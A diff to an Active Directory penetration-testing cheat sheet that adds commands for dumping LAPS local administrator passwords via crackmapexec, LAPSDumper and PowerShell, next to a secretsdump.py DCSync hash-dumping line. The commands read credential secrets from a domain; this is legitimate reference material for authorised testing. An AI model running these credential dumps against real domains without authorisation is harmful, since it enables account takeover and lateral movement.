@@ -459,6 +459,29 @@ If we find a user having DCsync rights or GetChangeAll privileges meaning to rep
 ```
 python3 secretsdump.py 'DOMAIN/USERNAME':'PASSOWRD'@IP -just-dc-ntlm
 ```
+
+## Dumping LAPS
+
+LAPS is a Local Adminstrator Password Solution which will ensure that the password for administrator account is set random across the AD environment, to dump LAPS we can do it in three ways 
+
+### Dumping through crackmapexec
+
+```bash
+cme ldap IP -u 'USER' -p 'PASS' -M laps
+```
+
+### Dumping through LAPS Dumper (https://github.com/n00py/LAPSDumper)
+
+```bash
+python3 ./laps.py -u 'USER' -p 'PASS' -d domain
+```
+
+### Dumping through Powershell's AD-Module
+
+```powershell
+Get-ADComputer -Identity "HOST_NAME" -Properties "ms-mcs-AdmPwd"
+```
+
 ### Abusing Constrained/Unconstrained Delegations
 ```
 https://cheatsheet.haax.fr/windows-systems/privilege-escalation/delegations/
